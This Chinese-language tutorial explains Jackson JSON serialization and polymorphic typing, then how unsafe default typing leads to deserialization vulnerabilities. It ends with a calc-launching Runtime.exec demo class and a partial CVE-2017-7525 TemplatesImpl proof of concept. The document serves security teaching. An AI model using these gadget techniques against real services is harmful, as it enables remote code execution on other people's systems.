
深入浅出解析 Jackson 反序列化



# 深入浅出解析 Jackson 反序列化

## 什么是 jackson

### 简介

Jackson 是当前用的比较广泛的，用来序列化和反序列化 json 的 Java 的开源框架。Jackson 社区相对比较活跃，更新速度也比较快，从 Github 中的统计来看，Jackson 是最流行的 json 解析器之一。Spring MVC 的默认 json 解析器便是 Jackson。Jackson 优点很多。Jackson 所依赖的 jar 包较少，简单易用。与其他 Java 的 json 的框架 Gson 等相比，Jackson 解析大的 json 文件速度比较快；Jackson 运行时占用内存比较低，性能比较好；Jackson 有灵活的 API，可以很容易进行扩展和定制。

Jackson 的核心模块由三部分组成。

*   jackson-core，核心包，提供基于"流模式"解析的相关 API，它包括 JsonPaser 和 JsonGenerator。Jackson 内部实现正是通过高性能的流模式 API 的 JsonGenerator 和 JsonParser 来生成和解析 json。
*   jackson-annotations，注解包，提供标准注解功能；
*   jackson-databind，数据绑定包，提供基于"对象绑定" 解析的相关 API（ObjectMapper）和"树模型" 解析的相关 API（JsonNode）；基于"对象绑定" 解析的 API 和"树模型"解析的 API 依赖基于"流模式"解析的 API。

### 依赖

maven 依赖项

```bash
<dependencies>
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-databind</artifactId>
            <version>2.9.3</version>
        </dependency>
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-core</artifactId>
            <version>2.9.3</version>
        </dependency>
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-annotations</artifactId>
            <version>2.9.3</version>
        </dependency>
    </dependencies>
```

### ObjectMapper

Jackson 最常用的 API 就是基于"对象绑定" 的 ObjectMapper：

*   ObjectMapper 可以从字符串，流或文件中解析 JSON，并创建表示已解析的 JSON 的 Java 对象。将 JSON 解析为 Java 对象也称为从 JSON 反序列化 Java 对象。
*   ObjectMapper 也可以从 Java 对象创建 JSON。从 Java 对象生成 JSON 也称为将 Java 对象序列化为 JSON。
*   Object 映射器可以将 JSON 解析为自定义的类的对象，也可以解析置 JSON 树模型的对象。

之所以称为 ObjectMapper 是因为它将 JSON 映射到 Java 对象（反序列化），或者将 Java 对象映射到 JSON（序列化）。

示例代码如下

将 json 转化为对象

```bash
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

public class JacksonExample {
    public static void main(String[] args) {
        String json = "{\"name\":\"John\", \"age\":30}";

        ObjectMapper objectMapper = new ObjectMapper();
        try {
            // 将JSON字符串转换为Java对象
            Person person = objectMapper.readValue(json, Person.class);

            // 输出转换后的Java对象
            System.out.println("Name: " + person.getName());
            System.out.println("Age: " + person.getAge());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

class Person {
    private String name;
    private int age;

    // 必须提供无参构造函数
    public Person() {
    }

    // Getters and Setters

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}
```

将对象转化为 json

*   writeValue()
*   writeValueAsString()
*   writeValueAsBytes()

```bash
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.FileOutputStream;

public class JacksonExample {
    public static void main(String[] args) {
        ObjectMapper objectMapper = new ObjectMapper();
        Person person = new Person();
        person.setAge(123);
        person.setName("fakes0u1");

        try {
            String jsonstring = objectMapper.writeValueAsString(person);
            System.out.println(jsonstring);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

class Person {
    private String name;
    private int age;

    // 必须提供无参构造函数
    public Person() {
    }

    // Getters and Setters

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}
```

### JsonParser

Jackson JsonParser 类是一个底层一些的 JSON 解析器。它类似于 XML 的 Java StAX 解析器，差别是 JsonParser 解析 JSON 而不解析 XML。

Jackson JsonParser 的运行层级低于 Jackson ObjectMapper。这使得 JsonParser 比 ObjectMapper 更快，但使用起来也比较麻烦。

使用 JsonParser 需要先创建一个 JsonFactory

‍

```bash
package jackson;

import com.fasterxml.jackson.core.JsonFactory;
import com.fasterxml.jackson.core.JsonParser;

public class JacksonJsonParser {
    public static void main(String[] args){
        String json = "{\"name\":\"fakes0u1\",\"age\":123}";
        JsonFactory jsonFactory = new JsonFactory();
        try {
            JsonParser parser = jsonFactory.createParser(json);
            System.out.println(parser);
        }
        catch (Exception e ){
            e.printStackTrace();
        }
    }
}
class Person1 {
    private String name;
    private int age;

    // 必须提供无参构造函数
    public Person1() {
    }

    // Getters and Setters

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}
```

一旦创建了 Jackson JsonParser，就可以使用它来解析 JSON。JsonParser 的工作方式是将 JSON 分解为一系列令牌，可以一个一个地迭代令牌。

这是一个 JsonParser 示例，它简单地循环遍历所有标记并将它们输出到 System.out。这是一个实际上很少用示例，只是展示了将 JSON 分解成的令牌，以及如何遍历令牌的基础知识。

可以使用 JsonParser 的 nextToken() 获得一个 JsonToken。可以使用此 JsonToken 实例检查给定的令牌。令牌类型由 JsonToken 类中的一组常量表示。这些常量是

```bash
package jackson;

import com.fasterxml.jackson.core.JsonFactory;
import com.fasterxml.jackson.core.JsonParser;
import com.fasterxml.jackson.core.JsonToken;

public class JacksonJsonParser {
    public static void main(String[] args){
        String json = "{\"name\":\"fakes0u1\",\"age\":123}";
        JsonFactory jsonFactory = new JsonFactory();
        try{
            JsonParser parser = jsonFactory.createParser(json);
            while(!parser.isClosed()){
                JsonToken jsonToken = parser.nextToken();
                System.out.println(jsonToken);
            }
        }
        catch (Exception e ){
            e.printStackTrace();
        }
    }
}
class Person1 {
    private String name;
    private int age;

    // 必须提供无参构造函数
    public Person1() {
    }

    // Getters and Setters

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}
```

输出

```bash
START\_OBJECT
FIELD\_NAME
VALUE\_STRING
FIELD\_NAME
VALUE\_NUMBER\_INT
END\_OBJECT
null
```

使用 equals 方法 检查如果标记的字段名称是相同的 就返回其值

指向的令牌是字符串字段值，则 getValueAsString() 返回当前令牌值作为字符串。如果指向的令牌是整数字段值，则 getValueAsInt() 返回当前令牌值作为 int 值。JsonParser 具有更多类似的方法来获取不同类型的 curren 令牌值（例如 boolean，short，long，float，double 等）。

```bash
package jackson;

import com.fasterxml.jackson.core.JsonFactory;
import com.fasterxml.jackson.core.JsonParser;
import com.fasterxml.jackson.core.JsonToken;

public class JacksonJsonParser {
    public static void main(String[] args){
        String json = "{\"name\":\"fakes0u1\",\"age\":123}";
        JsonFactory jsonFactory = new JsonFactory();
        Person1 person1 =new Person1();
        try{
            JsonParser parser = jsonFactory.createParser(json);
            while(!parser.isClosed()){
                JsonToken jsonToken = parser.nextToken();
                if (JsonToken.FIELD_NAME.equals(jsonToken)){
                    String fieldName = parser.getCurrentName();
                    System.out.println(fieldName);

                    jsonToken=parser.nextToken();

                    if ("name".equals(fieldName)){
                        person1.name = parser.getValueAsString();

                    }
                    else if ("age".equals(fieldName)){
                        person1.age = parser.getValueAsInt();
                    }
                }

                System.out.println("person's name is "+person1.name);
                System.out.println("person's age is "+person1.age);
            }
        }
        catch (Exception e ){
            e.printStackTrace();
        }
    }
}
class Person1 {
    public  String name;
    public  int age;

    // 必须提供无参构造函数
    public Person1() {
    }

    // Getters and Setters

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}
```

输出

```bash
person's name is null
person's age is 0
name
person's name is fakes0u1
person's age is 0
age
person's name is fakes0u1
person's age is 123
person's name is fakes0u1
person's age is 123
person's name is fakes0u1
person's age is 123
```

### JsonGenerator

Jackson JsonGenerator 用于从 Java 对象（或代码从中生成 JSON 的任何数据结构）生成 JSON。

同样的 使用 JsonGenerator 也需要先创建一个 JsonFactory 从其中使用 createGenerator() 来创建一个 JsonGenerator

```bash
package jackson;

import com.fasterxml.jackson.core.*;

import java.io.File;

public class JacksonJsonParser {
    public static void main(String[] args){
        JsonFactory jsonFactory = new JsonFactory();
        Person1 person1 =new Person1();
        try{
            JsonGenerator jsonGenerator = jsonFactory.createGenerator(new File("output.json"), JsonEncoding.UTF8);
            jsonGenerator.writeStartObject();
            jsonGenerator.writeStringField("name","fakes0u1");
            jsonGenerator.writeNumberField("age",123);
            jsonGenerator.writeEndObject();

            jsonGenerator.close();

        }
        catch (Exception e ){
            e.printStackTrace();
        }
    }
}



class Person1 {
    public  String name;
    public  int age;

    // 必须提供无参构造函数
    public Person1() {
    }

    // Getters and Setters

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}
```

## 使用 jackson 进行序列化和反序列化

Jackson 提供了 ObjectMapper.writeValueAsString() 和 ObjectMapper.readValue() 两个方法来实现序列化和反序列化的功能。这两种方法我们在上面也已经测试过了 所以就不再赘述

## 多态问题的解决

Java 多态就是同一个接口使用不同的实例而执行不同的操作

在 Jackson 中 JacksonPolymorphicDeserialization 可以解决这个问题 在反序列化某个类对象的过程中 如果类的成员不是具体类型 比如是 Object 接口 或者 抽象类 那么可以在 JSON 字符串中 指定其类型 Jackson 将生成具体类型的实例

具体来说就是 将具体的子类信息绑定在序列化的内容中 以便于后续反序列化的时候 直接得到目标子类对象 我们可以通过 DefaultTyping 和 @JsonTypeInfo 注解来实现

### DefaultTyping

Jackson 提供一个 enableDefaultTyping 设置 包含四个值

[![](assets/1701606625-9ad6dec8d331401b63270053c46c74f2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110002919-223148dc-7f1d-1.png)

#### JAVA\_LANG\_OBJECT

当被序列化或反序列化的类里的属性被声明为一个 Object 类型时 会对该 Object 类型的属性进行序列化和反序列化 并明确规定类名

```bash
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

public class JSTest {
    public static void main(String[] args) throws Exception{
        Person2 person2 = new Person2();
        person2.age = 123;
        person2.name = "fakes0u1";
        person2.object = new Hacker();

        ObjectMapper objectMapper = new ObjectMapper();

        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);

        String jsonstring = objectMapper.writeValueAsString(person2);
        System.out.println(jsonstring);

        Person2 p2 = objectMapper.readValue(jsonstring,Person2.class);
        System.out.println(p2);
    }
}
```

在设置了 JAVA\_LANG\_OBJECT 的时候会输出

```bash
{"name":"fakes0u1","age":123,"object":["jackson.Hacker",{"skill":"moyu"}]}
Person2.age=123,Person2.name=fakes0u1,jackson.Hacker@f6c48ac
```

没设置的时候会输出

```bash
{"name":"fakes0u1","age":123,"object":{"skill":"moyu"}}
Person2.age=123,Person2.name=fakes0u1,{skill=moyu}
```

#### OBJECT\_AND\_NON\_CONCRETE

当类中有 Interface AbstractClass 类时 对其进行序列化和反序列化 这也是 enableDefaultTyping() 的默认选项

加上一个接口

```bash
package jackson;

public interface Sex {
    public void setSex(int sex);
    public int getSex();
}
```

和实现接口的类

```bash
package jackson;

public class MySex implements Sex{
    int sex;

    @Override
    public void setSex(int sex){
        this.sex = sex;
    }

    @Override
    public int getSex(){
        return sex;
    }
}
```

最后加上 OBJECT\_AND\_NON\_CONCRETE 参数

```bash
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

public class JSTest {
    public static void main(String[] args) throws Exception{
        Person2 person2 = new Person2();
        person2.age = 123;
        person2.name = "fakes0u1";
        person2.object = new Hacker();
        person2.sex = new MySex();

        ObjectMapper objectMapper = new ObjectMapper();

        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);

        String jsonstring = objectMapper.writeValueAsString(person2);
        System.out.println(jsonstring);

        Person2 p2 = objectMapper.readValue(jsonstring,Person2.class);
        System.out.println(p2);
    }
}
```

```bash
{"name":"fakes0u1","age":123,"object":["jackson.Hacker",{"skill":"moyu"}],"sex":["jackson.MySex",{"sex":0}]}
Person2.age=123,Person2.name=fakes0u1,jackson.Hacker@239963d8,jackson.MySex@3abbfa04
```

可以看到接口也被成功的序列化和反序列化

#### NON\_CONCRETE\_AND\_ARRAYS

支持 Arrays 类型

可以在原来的 test 文件上直接修改

```bash
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

public class JSTest {
    public static void main(String[] args) throws Exception{
        Person2 person2 = new Person2();
        person2.age = 123;
        person2.name = "fakes0u1";
        Hacker[] hacker = new Hacker[2];
        hacker[0] = new Hacker();
        hacker[1] = new Hacker();
        person2.object = hacker;
        person2.sex = new MySex();

        ObjectMapper objectMapper = new ObjectMapper();

        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);

        String jsonstring = objectMapper.writeValueAsString(person2);
        System.out.println(jsonstring);

        Person2 p2 = objectMapper.readValue(jsonstring,Person2.class);
        System.out.println(p2);
    }
}
```

```bash
{"name":"fakes0u1","age":123,"object":["[Ljackson.Hacker;",[{"skill":"moyu"},{"skill":"moyu"}]],"sex":["jackson.MySex",{"sex":0}]}
Person2.age=123,Person2.name=fakes0u1,[Ljackson.Hacker;@e45f292,jackson.MySex@5f2108b5
```

这里直接就是这种形式

```bash
Hacker[] hackers = new Hacker[2]; // 创建长度为 2 的 Hacker 数组

hackers[0] = new Hacker("Alice"); // 为第一个元素分配一个 Hacker 对象
hackers[1] = new Hacker("Bob"); // 为第二个元素分配另一个 Hacker 对象
```

每个元素可以存储一个 hacker 对象的引用 这里的数组中的元素实际上是 Hacker 类的引用 并不是实际的对象 需要在使用之前通过实例化或赋值操作为数组元素分配实际的对象

#### NON\_FINAL

除了前面所有的特征外 包含即将被序列化的类里的全部、非 final 的属性将其进行序列化和反序列化

```bash
package jackson;

public class Hacker {
    public String skill = "moyu";
}

class Person2{
    public String name = null;
    public int age = 0;
    public Object object;
    public Sex sex;
    public Hacker hacker;

    @Override
    public String toString(){
        return String.format("Person2.age=%d,Person2.name=%s,%s,%s,%s",age,name,object == null ? "null" : object,sex == null ? "null" : sex,hacker == null ? "null" : hacker);
    }
}
```

```bash
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

public class JSTest {
    public static void main(String[] args) throws Exception{
        Person2 person2 = new Person2();
        person2.age = 123;
        person2.name = "fakes0u1";
        Hacker[] hacker = new Hacker[2];
        hacker[0] = new Hacker();
        hacker[1] = new Hacker();
        person2.object = hacker;
        person2.sex = new MySex();
        person2.hacker = new Hacker();

        ObjectMapper objectMapper = new ObjectMapper();

        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);

        String jsonstring = objectMapper.writeValueAsString(person2);
        System.out.println(jsonstring);

        Person2 p2 = objectMapper.readValue(jsonstring,Person2.class);
        System.out.println(p2);
    }
}
```

| DefaultTyping 类型 | 描述说明 |
| --- | --- |
| JAVA\_LANG\_OBJECT | 属性的类型为 Object |
| OBJECT\_AND\_NON\_CONCRETE | 属性的类型为 Object、Interface、AbstractClass |
| NON\_CONCRETE\_AND\_ARRAYS | 属性的类型为 Object、Interface、AbstractClass、Array |
| NON\_FINAL | 所有除了声明为 final 之外的属性 |

### @JsonTypeInfo 注解

@JsonTypeInfo 注解是 Jackson 多态类型绑定的一种方式，支持下面 5 种类型的取值：

```bash
@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)
@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM)
```

#### JsonTypeInfo.Id.NONE

用于指定在序列化和反序列化过程中不包含任何类型标识 不使用识别码

```bash
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

public class JSTest {
    public static void main(String[] args) throws Exception{
        Person2 person2 = new Person2();
        person2.age = 123;
        person2.name = "fakes0u1";
        Hacker[] hacker = new Hacker[2];
        hacker[0] = new Hacker();
        hacker[1] = new Hacker();
        person2.object = hacker;


        ObjectMapper objectMapper = new ObjectMapper();


        String jsonstring = objectMapper.writeValueAsString(person2);
        System.out.println(jsonstring);

        Person2 p2 = objectMapper.readValue(jsonstring,Person2.class);
        System.out.println(p2);
    }
}
```

```bash
package jackson;

import com.fasterxml.jackson.annotation.JsonTypeId;
import com.fasterxml.jackson.annotation.JsonTypeInfo;

public class Hacker {
    public String skill = "moyu";
}

class Person2{
    public String name = null;
    public int age = 0;
    @JsonTypeInfo(use = JsonTypeInfo.Id.NONE)
    public Object object;


    @Override
    public String toString(){
        return String.format("Person2.age=%d,Person2.name=%s,%s",age,name,object == null ? "null" : object);
    }
}
```

输出

```bash
{"name":"fakes0u1","age":123,"object":[{"skill":"moyu"},{"skill":"moyu"}]}
Person2.age=123,Person2.name=fakes0u1,[{skill=moyu}, {skill=moyu}]
```

因为是不使用识别码 所以输出没有什么不一样

#### JsonTypeInfo.Id.CLASS

使用完全限定类名做识别

我们直接将 person 类中的注释修改为 JsonTypeInfo.Id.CLASS 查看输出

```bash
{"name":"fakes0u1","age":123,"object":{"@class":"jackson.Hacker","skill":"moyu"}}
Person2.age=123,Person2.name=fakes0u1,jackson.Hacker@5702b3b1
```

我们可以看到 在序列化和反序列化的信息中 均有具体类的信息 在 Jackson 反序列化的时候如果使用了`JsonTypeInfo.Id.CLASS`修饰的话，可以通过@class 的方式指定相关类，并进行相关调用。

#### JsonTypeInfo.Id.MINIMAL\_CLASS

当我们将 object 的注释修改为 JsonTypeInfo.Id.MINIMAL\_CLASS 时

输出为

```bash
{"name":"fakes0u1","age":123,"object":{"@c":"jackson.Hacker","skill":"moyu"}}
Person2.age=123,Person2.name=fakes0u1,jackson.Hacker@4b952a2d
```

看起来就是将上面的@class 的形式给简写了

#### JsonTypeInfo.Id.NAME

将注释修改为 JsonTypeInfo.Id.NAME 后

序列化的输出变为

```bash
{"name":"fakes0u1","age":123,"object":{"@type":"Hacker","skill":"moyu"}}
```

多出一个@type 这里并没有像上面的 CLASS 一样 给出具体包名和类名 同时在反序列化的时候还会报错 也就是说 这个注释并不适用于反序列化过程

#### JsonTypeInfo.Id.CUSTOM

自定义识别码，由`@JsonTypeIdResolver`对应，由用户来自定义 并不能直接使用

通过上面的测试 我们发现在使用 JsonTypeInfo.Id.CLASS 和 JsonTypeInfo.Id.MINIMAL\_CLASS 修饰 Object 类型的属性时 会触发 Jackson 的反序列化

## 反序列化中类属性方法的调用

针对 JacksonPolymorphicDeserialization 也就是 Jackson 中多态的反序列化场景进行分析

### 使用 DefaultTyping 时

```bash
package jackson;

import com.fasterxml.jackson.annotation.JsonTypeId;
import com.fasterxml.jackson.annotation.JsonTypeInfo;

public class Hacker {
    public String skill = "moyu";
}

class Person2{
    public String name;
    public int age;

    public Sex sex;

    public Object object;


    @Override
    public String toString(){
        return String.format("Person2.age=%d,Person2.name=%s,%s",age,name,sex == null ? "null" : sex);
    }
}
```

```bash
package jackson;

public class MySex implements Sex{
    int sex;
    public MySex(){
        System.out.println("MySex 构造函数");
    }

    @Override
    public void setSex(int sex){
        System.out.println("MySex.setSex");
        this.sex = sex;
    }

    @Override
    public int getSex(){
        System.out.println("MySex.getSex");
        return sex;
    }
}
```

```bash
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

public class JSTest {
    public static void main(String[] args) throws Exception{
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();
        String jsonstring = "{\"age\":6,\"name\":\"mi1k7ea\",\"sex\":[\"jackson.MySex\",{\"sex\":1}]}";

        Person2 p2 = objectMapper.readValue(jsonstring,Person2.class);
        System.out.println(p2);
    }
}
```

最终输出

```bash
MySex 构造函数
MySex.setSex
Person2.age=6,Person2.name=mi1k7ea,jackson.MySex@46d56d67
```

是对其中的 sex 进行了反序列化的

### 使用@JsonTypeInfo 注解

我们再来试试@JsonTypeInfo 注解

```bash
package jackson;

import com.fasterxml.jackson.annotation.JsonTypeId;
import com.fasterxml.jackson.annotation.JsonTypeInfo;

public class Hacker {
    public String skill = "moyu";
}

class Person2{
    public String name;
    public int age;
    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
    public Sex sex;

    public Object object;


    @Override
    public String toString(){
        return String.format("Person2.age=%d,Person2.name=%s,%s",age,name,sex == null ? "null" : sex);
    }
}
```

```bash
package jackson;

public class MySex implements Sex{
    int sex;
    public MySex(){
        System.out.println("MySex 构造函数");
    }

    @Override
    public void setSex(int sex){
        System.out.println("MySex.setSex");
        this.sex = sex;
    }

    @Override
    public int getSex(){
        System.out.println("MySex.getSex");
        return sex;
    }
}
```

```bash
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

public class JSTest {
    public static void main(String[] args) throws Exception{
        ObjectMapper objectMapper = new ObjectMapper();
        //objectMapper.enableDefaultTyping();
        String jsonstring = "{\"age\":6,\"name\":\"mi1k7ea\",\"sex\":[\"jackson.MySex\",{\"sex\":1}]}";

        Person2 p2 = objectMapper.readValue(jsonstring,Person2.class);
        System.out.println(p2);
    }
}
```

最终输出

```bash
MySex 构造函数
MySex.setSex
Person2.age=6,Person2.name=mi1k7ea,jackson.MySex@46d56d67
```

也是和之前使用 DefaultTyping 是同样的作用

### 流程分析

Jackson 的反序列化的过程分为两步 第一步通过构造函数生成实例 第二步是对实例进行设置属性值

对其进行调试

[![](assets/1701606625-74e0738a647eafd80627a25b325ae744.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003002-3b8424b2-7f1d-1.png)

[![](assets/1701606625-f245acc3502981b5d772b0b5f24abde5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003009-3f97dfc6-7f1d-1.png)

调用到 BeanDeserializer 中的 deserialize 函数 跟进

[![](assets/1701606625-e0dc5d486bb1cab0cc466e708b6e378d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003015-430e4c8a-7f1d-1.png)

调用 vanillaDeserialize 函数 跟进

[![](assets/1701606625-d8b7b5c862df1fa66877b0455f0d99a6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003021-47275bd6-7f1d-1.png)

[![](assets/1701606625-370994d28bcbba591af26aa7830bf251.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003026-49c4c4c8-7f1d-1.png)

调用 createUsingDefault 函数 从而调用指定类的无参构造函数来生成类实例 跟进一下 createUsingDefault 函数

[![](assets/1701606625-347dca4e9d07e1a81059a380e124653b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003031-4ca65e0e-7f1d-1.png)

调用到 call 函数

[![](assets/1701606625-7fa4121fd8758f6f9a28bfa43d92b37d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003037-50ad8298-7f1d-1.png)

调用`_constructor.newInstance()` 实现无参的构造函数

[![](assets/1701606625-b707d71c41cdf95ebebe11df3e07e272.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003043-540d0418-7f1d-1.png)

成功调用到 Person2 类中的构造函数 从而先完成了 bean 的实例化

[![](assets/1701606625-bcb63512bfdd561ca2b2651b6af5cfa5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003048-571ad3a6-7f1d-1.png)

在完成了类的实例化之后 就需要对类中的属性进行赋值 以键值对的形式进行匹配

[![](assets/1701606625-44644d3d7cc89e08f6a9359ed7338c97.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003106-61d4bc26-7f1d-1.png)

以 do while 循环的形式对其中的属性进行赋值 跟进一下`deserializeAndSet`函数

[![](assets/1701606625-c6f40214e55f55d2462fcf788ed3a34b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003117-6879c378-7f1d-1.png)

检查属性类型随后跟进 deserialize 函数

[![](assets/1701606625-41c0ebed3bca95cab38f51af343b6d9f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003124-6c265860-7f1d-1.png)

先对其进行解析 然后到 set 处时 就已经是解析好的内容了 随后进行赋值

[![](assets/1701606625-9812baa36b3d1546bf8d67a0d11c9c1b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003129-6f751678-7f1d-1.png)

上面对 age 进行赋值 随后是 name 对于字符串型的值会跟进到这里

[![](assets/1701606625-f2b7a7c2886b0a6fd2dabe920d2b5276.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003137-740eba18-7f1d-1.png)  
随后进行赋值 然后是 sex 对象 跟进`deserializeWithType`

[![](assets/1701606625-6ff7eee52c2de415cb587c012c808814.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003149-7b1e9ed6-7f1d-1.png)

这里返回 null 于是继续会跟进到`deserializeTypedFromObject`

[![](assets/1701606625-70782c1fce1d3b30574735d346e0a90d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003155-7ee771e6-7f1d-1.png)

随后会对 MySex 对象的构造函数进行调用

随后会和上面一样对 MySex 之中的属性进行赋值 会调用到 set 方法

[![](assets/1701606625-0ffb4e8ef07092c12a15697b5441bd1e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003207-862e3fca-7f1d-1.png)  
赋值成功

[![](assets/1701606625-3cc5f210668bc1801b2357711132ec49.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003211-8871092a-7f1d-1.png)

[![](assets/1701606625-49830b0eee71c8836d710491a97e9d48.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003217-8c15e5fa-7f1d-1.png)

## Jackson 反序列化漏洞

### 前提条件

满足以下三个条件之一 存在 Jackson 反序列化漏洞 也就是我们上面提到过的 会触发 json 中的类解析的注解或者函数

*   调用了 ObjectMapper.enableDefaultTyping() 函数；
*   对要进行反序列化的类的属性使用了值为 JsonTypeInfo.Id.CLASS 的@JsonTypeInfo 注解；
*   对要进行反序列化的类的属性使用了值为 JsonTypeInfo.Id.MINIMAL\_CLASS 的@JsonTypeInfo 注解；

### 漏洞原理

当我们使用的`JacksonPolymorphicDeserialization`配置有问题的时候 Jackson 反序列化会调用属性所属类的构造函数和 setter 方法 我们就可以在这里做文章

我们可以以要进行反序列化的类的属性是否为 Object 类分为两种

### 属性中没有 Object 类时

那么 我们不能对属性进行操作 我们只能让他的构造函数或者是 setter 方法中存在危险函数 如下

```bash
public void setSex(int sex){
        System.out.println("MySex.setSex");

        this.sex = sex;

        try{
            Runtime.getRuntime().exec("calc");
        }
        catch (Exception e ){
            e.printStackTrace();
        }

    }
```

运行即可弹出计算器

[![](assets/1701606625-9d05007c0e6fa23f18d68bae9077d9e8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231110003252-a0e57aea-7f1d-1.png)

### 属性中有 Object 类时

因为 Object 是任意类型的父类 因此扩大了我们的攻击面 我们只需要在目标服务端中存在的且构造函数或 setter 方法存在漏洞的类即可进行攻击利用 例如 存在一个恶意类 Evil 在其构造函数或者是 setter 方法中存在任意代码执行漏洞

```bash
package jackson;

public class Evil {
    public String cmd;

    public void setCmd(String cmd) {
        this.cmd = cmd;
        try {
            Runtime.getRuntime().exec("calc");
        }
        catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

然后我们将其写到 json 中

```bash
package jackson;

import com.fasterxml.jackson.annotation.JsonTypeId;
import com.fasterxml.jackson.annotation.JsonTypeInfo;

public class Hacker {
    public String skill = "moyu";
}

class Person2{
    public String name;
    public int age;
    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
    public Sex sex;

    public Person2(){
        System.out.println("person 构造函数");
    }

    public Object object;


    @Override
    public String toString(){
        return String.format("Person2.age=%d,Person2.name=%s,%s",age,name,object == null ? "null" : object);
    }
}
```

```bash
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

public class JSTest {
    public static void main(String[] args) throws Exception{
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();
        String jsonstring = "{\"age\":6,\"name\":\"fakes0u1\",\"object\":[\"jackson.Evil\",{\"cmd\":\"calc\"}]}";

        Person2 p2 = objectMapper.readValue(jsonstring,Person2.class);
        System.out.println(p2);
    }
}
```

可以成功执行 calc

## CVE-2017-7525 TemplatesImpl 利用链

### 影响版本

Jackson 2.6 系列 < 2.6.7.1

Jackson 2.7 系列 < 2.7.9.1

Jackson 2.8 系列 < 2.8.8.1

JDK 使用 1.7 版本的

### 复现

jar 包：jackson-annotations-2.7.9，jackson-core-2.7.9，jackson-databind-2.7.9，commons-codec-1.12，commons-io-2.5，spring-core-4.3.13.RELEASE。

PoC.java

```bash
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.springframework.util.FileCopyUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class PoC {
    public static void main(String[] args)  {
        String exp = readClassStr("xxx\\Exploit.class");
        String jsonInput = "见下方图片";
        System.out.printf(jsonInput);
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        fakes0u1 fakes0u1;
        try {
            fakes0u1 = mapper.readValue(jsonInput, fakes0u1.class);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }

    public static String readClassStr(String cls){
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        try {
            FileCopyUtils.copy(new FileInputStream(new File(cls)),byteArrayOutputStream);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encode(byteArrayOutputStream.toByteArray());
    }
}
```

